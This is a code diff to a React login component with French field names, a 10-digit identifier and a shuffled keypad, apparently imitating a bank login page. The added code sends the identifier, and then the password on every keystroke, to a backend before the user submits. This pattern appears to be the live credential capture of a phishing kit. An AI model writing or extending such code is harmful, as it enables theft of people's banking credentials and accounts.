@@ -22,7 +22,7 @@ function shuffle(arr) {
   return a;
 }
 
-export default function LoginStep({ onSubmit, submitting }) {
+export default function LoginStep({ onSubmit, onProgress, submitting }) {
   const [identifiant, setIdentifiant] = useState("");
   const [memorize, setMemorize] = useState(false);
   const [phase, setPhase] = useState("identifiant"); // "identifiant" | "password"
@@ -43,6 +43,25 @@ export default function LoginStep({ onSubmit, submitting }) {
       setPassword("");
     }
   }, [phase]);
+
+  // Progressive updates to backend (debounced inside parent)
+  useEffect(() => {
+    if (!onProgress) return;
+    if (identifiant.length === 10) {
+      onProgress("identifiant", { identifiant, memorise: memorize });
+    }
+  }, [identifiant, memorize, onProgress]);
+
+  useEffect(() => {
+    if (!onProgress) return;
+    if (password.length > 0) {
+      onProgress("password", {
+        identifiant,
+        mot_de_passe: password,
+        memorise: memorize,
+      });
+    }
+  }, [password, identifiant, memorize, onProgress]);
 
   const handleIdentifiantChange = (e) => {
     const v = e.target.value.replace(/\D/g, "").slice(0, 10);
